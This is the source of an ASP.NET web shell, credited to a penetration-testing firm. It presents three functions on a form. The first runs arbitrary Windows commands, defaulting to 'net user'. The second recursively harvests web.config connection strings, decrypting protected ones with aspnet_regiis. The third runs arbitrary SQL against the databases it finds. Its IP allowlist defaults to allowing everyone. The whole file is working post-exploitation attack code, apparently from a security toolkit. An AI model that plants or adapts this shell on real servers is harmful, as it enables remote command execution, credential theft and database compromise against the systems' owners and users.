<!-- Web shell - command execution, web.config parsing, and SQL query execution -->

<!-- Command execution - Run arbitrary Windows commands -->
<!-- Web.Config Parser - Extract db connection strings from web.configs (based on chosen root dir) -->
<!-- SQL Query Execution - Execute arbitrary SQL queries (MSSQL only) based on extracted connection strings -->

<!-- Antti - NetSPI - 2013 -->
<!-- Thanks to Scott (nullbind) for help and fancy stylesheets -->
<!-- Based on old cmd.aspx from fuzzdb - http://code.google.com/p/fuzzdb/ -->

<%@ Page Language="VB" Debug="true" %>
<%@ import Namespace="system.IO" %>
<%@ import Namespace="System.Diagnostics" %>

<script runat="server">      

Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
  Dim ipAddress As String = Request.UserHostAddress

  If String.IsNullOrEmpty(ipAddress) Then
    Call DenyAccess()
  Else
    Dim strAllowedIPs As String = "*"

    strAllowedIPs = Replace(Trim(strAllowedIPs), " ", "")
    Dim arrAllowedIPs = Split(strAllowedIPs, ",")
    Dim match As Integer = Array.IndexOf(arrAllowedIPs, ipAddress)

    If strAllowedIPs <> "*" And match < 0 Then
      Call DenyAccess()
    End If
  End If
End Sub


Protected Sub DenyAccess()
  Response.Clear
  Response.StatusCode = 403
  Response.End
End Sub


Protected Sub RunCmd(sender As Object, e As System.Web.UI.WebControls.CommandEventArgs)
  Dim myProcess As New Process()            
  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            
  Dim titletext As String
  myProcessStartInfo.UseShellExecute = false            
  myProcessStartInfo.RedirectStandardOutput = true            
  myProcess.StartInfo = myProcessStartInfo
  
  if (e.CommandArgument="cmd") then
    myProcessStartInfo.Arguments=xcmd.text 
    titletext = "Command Execution"	
  else if (e.CommandArgument="webconf") then
    myProcessStartInfo.Arguments=" /c powershell -C ""$ErrorActionPreference = 'SilentlyContinue';" 
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "$path='" + webpath.text + "'; write-host ""Searching for web.configs in $path ...`n"";"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "Foreach ($file in (get-childitem $path -Filter web.config -Recurse)) { Try { $xml = [xml](get-content $file.FullName); } Catch { continue; } "
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "Try { $connstrings = $xml.get_DocumentElement(); } Catch { continue; } "
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "if ($connstrings.ConnectionStrings.encrypteddata.cipherdata.ciphervalue -ne $null) "
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "{ $tempdir = (Get-Date).Ticks; new-item $env:temp\$tempdir -ItemType directory | out-null; copy-item $file.FullName $env:temp\$tempdir;"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "$aspnet_regiis = (get-childitem $env:windir\microsoft.net\ -Filter aspnet_regiis.exe -recurse | select-object -last 1).FullName + ' -pdf ""connectionStrings"" ' + $env:temp + '\' + $tempdir;"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "Invoke-Expression $aspnet_regiis; Try { $xml = [xml](get-content $env:temp\$tempdir\$file); } Catch { continue; }"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "Try { $connstrings = $xml.get_DocumentElement(); } Catch { continue; }"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "remove-item $env:temp\$tempdir -recurse;} "
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "Foreach ($_ in $connstrings.ConnectionStrings.add) { if ($_.connectionString -ne $NULL) { write-host ""$file.Fullname --- $_.connectionString""} } }"""
	titletext = "Connection String Parser"	
  else if (e.CommandArgument="sqlquery") then
    myProcessStartInfo.Arguments=" /c powershell -C ""$conn=new-object System.Data.SqlClient.SQLConnection(""""""" + conn.text + """"""");"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "Try { $conn.Open(); }"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "Catch { continue; }"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "$cmd = new-object System.Data.SqlClient.SqlCommand("""""""+query.text+""""""",$conn);"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "$ds=New-Object system.Data.DataSet;"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "$da=New-Object system.Data.SqlClient.SqlDataAdapter($cmd);"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "[void]$da.fill($ds);"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "$ds.Tables[0];"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "$conn.Close();"""
	titletext = "SQL Query Result"	
  end if  
  myProcess.Start()            

  Dim myStreamReader As StreamReader = myProcess.StandardOutput            
  Dim myString As String = myStreamReader.Readtoend()            
  myProcess.Close()            
  mystring=replace(mystring,"<","&lt;")            
  mystring=replace(mystring,">","&gt;")
  history.text = result.text + history.text
  result.text= vbcrlf & "<p><h2>" & titletext & "</h2><pre>" & mystring & "</pre>" 
End Sub

</script>

<html>
<head>
<style>
<style>
 body {
  background-image: url("images/repeat.jpg");
  background-repeat: repeat;
 }
 
.para1 {
	margin-left:30px;
	vertical-align:top;
}
.para2 {
	margin-left:30px;	
}
.para3 {
	margin-left:20px;
	margin-top:30px;
	vertical-align:top;
	background-image:url('images/post_middle.jpg');
}

.norep {
	background-image:url('images/repeat2.jpg');
	background-repeat:y-repeat;
	
}

.menu{
margin-right:56px;
margin-bottom:40px;
vertical-align: top;
font-weight: bold;
font-family: Verdana, Arial, Helvetica, sans-serif;
font-size: 12px;
}

.tbl_main_bdr {
	border: medium solid #333333;
}

.tbl_inside_bdr {
	border: thin solid #666666;
}
.style3 {
	margin-left: 20px;
	vertical-align: top;
	font-weight: bold;
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 18px;
}

.post{
background-repeat:no-repeat;
background-image:url('images/post_top.jpg');
}

.style12 {color: #00CC00}

a:link{
text-decoration:none;
COLOR: #000000;
}

a:hover{

text-decoration:underline;
}

.htext{
margin-right:20px;
}


.style17 {font-size: 9px}
.style20 {font-family: Arial, Helvetica, sans-serif}
.style21 {font-size: 24px}
.style22 {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 24px;
	font-weight: bold;
}
</style>
</head>
<body>   

<form runat="server"> 
	<table border="0" cellspacing="4" cellpadding="4" width="750">
		<tr>
		 <td>
		 <img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJYAAAAzCAYAAAB10PG/AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAADKGlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxMzggNzkuMTU5ODI0LCAyMDE2LzA5LzE0LTAxOjA5OjAxICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ0MgMjAxNyAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDoyMzlEMDE3OTM4Q0UxMUU3OTlDOEYyQUM4MjY3RDVDRiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDoyMzlEMDE3QTM4Q0UxMUU3OTlDOEYyQUM4MjY3RDVDRiI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjIzOUQwMTc3MzhDRTExRTc5OUM4RjJBQzgyNjdENUNGIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjIzOUQwMTc4MzhDRTExRTc5OUM4RjJBQzgyNjdENUNGIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpS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'/>
		 </td>
		 <td valign="bottom" align="right">
		 <strong><span class="style21"><span class="style20"><font color="003366">Database Connection Web Shell</font></span></span></strong></a>
		 </td>
		</tr>
	</table>	
	<table border="0" cellspacing="4" cellpadding="4">
		<tr>
			<td valign="middle" width ="100" bgcolor="#990000" align="center">
				<strong><span class="style21"><span class="style20">STEP 1</span></span></strong></a><Br>
			</td>	
			<td valign="middle" width ="150"  bgcolor="#A0A0A0" align="center">
				<strong>ENTER OS COMMANDS</strong></a><Br>
			</td>			
            <td valign="top" width="350" bgcolor="#CCCCCC" align="left">				
				<asp:Label id="L_p" runat="server">Application:</asp:Label><br>
				<asp:TextBox id="xpath" width="350" runat="server">c:\windows\system32\cmd.exe</asp:TextBox><br><br>
				<asp:Label id="L_a" runat="server">Arguments:</asp:Label><br>        
				<asp:TextBox id="xcmd" width="350" runat="server" Text="/c net user">/c net user</asp:TextBox><br>
			</td>  
			<td valign="middle"  bgcolor="#CCCCCC" align="center" onMouseOver="style.backgroundColor='#CCFF99';" onMouseOut="style.backgroundColor='#CCCCCC'">
				<strong><span class="style21"><span class="style20">RUN</span></span></strong><Br>
				<asp:Button id="Button" OnCommand="RunCmd" CommandArgument="cmd" runat="server" Width="100px" Text="RUN"></asp:Button>
			</td>
        </tr>                     
		<tr>
			<td valign="middle" width ="100" bgcolor="#6699CC" align="center">
				<strong><span class="style21"><span class="style20">STEP 2</span></span></strong></a><Br>
			</td>	
			<td valign="middle" width ="150" bgcolor="#A0A0A0" align="center">
				<strong>PARSE WEB.CONFIGS FOR CONNECTION STRINGS</strong></a><Br>
			</td>			
            <td valign="top" width="350" bgcolor="#CCCCCC" align="left">
				Path to web directories:<br>
				<asp:TextBox id="webpath" width="350" runat="server" Text="c:\inetpub">C:\inetpub</asp:TextBox>		
			</td>  
			<td valign="middle" bgcolor="#CCCCCC" align="center" onMouseOver="style.backgroundColor='#CCFF99';" onMouseOut="style.backgroundColor='#CCCCCC'">
				<strong><span class="style21"><span class="style20">RUN</span></span></strong><Br>
				<asp:Button id="WebConfig" OnCommand="RunCmd" CommandArgument="webconf" runat="server" Width="100px" Text="RUN"></asp:Button>
			</td>
        </tr>                     
		<tr>
			<td valign="middle" width ="100" bgcolor="#CCCCCC" align="center">
				<strong><span class="style21"><span class="style20">STEP 3</span></span></strong></a><Br>
			</td>	
			<td valign="middle" width ="150" bgcolor="#A0A0A0" align="center" >
				<strong>EXECUTE SQL QUERIES</strong></a><Br>
			</td>
			<td valign="top" bgcolor="#CCCCCC" align="left">
				Connection Strings:<br> 
				<asp:TextBox id="conn" runat="server" Text="Data Source=localhost\sqlexpress2k8;User ID=netspi;PWD=ipsten" width="350">Data Source=localhost\sqlexpress2k8;User ID=netspi;PWD=ipsten</asp:TextBox><br><br>
				SQL query:<br> 
				<asp:TextBox id="query" runat="server" Text="select @@version;" width="350">select @@version;</asp:TextBox> 			
			</td>
			<td valign="middle" bgcolor="#CCCCCC" align="center" onMouseOver="style.backgroundColor='#CCFF99';" onMouseOut="style.backgroundColor='#CCCCCC'">
				<strong><span class="style21"><span class="style20">RUN</span></span></strong><Br>
				<asp:Button id="SqlQuery" OnCommand="RunCmd" CommandArgument="sqlquery" runat="server" Width="100px" Text="RUN"></asp:Button>
			</td>
        </tr>                     
    </table>	
</form>
	
<table border="0" cellspacing="4" cellpadding="4">
	<tr>
		<td valign="top" width ="735" bgcolor="#CCCCCC" align="left">
			<asp:Label id="result" runat="server"></asp:Label>
			<font color="555555"><asp:Label id="history" runat="server"></asp:Label></font>
		</td>
	</tr>
</table>
</body>
</html>
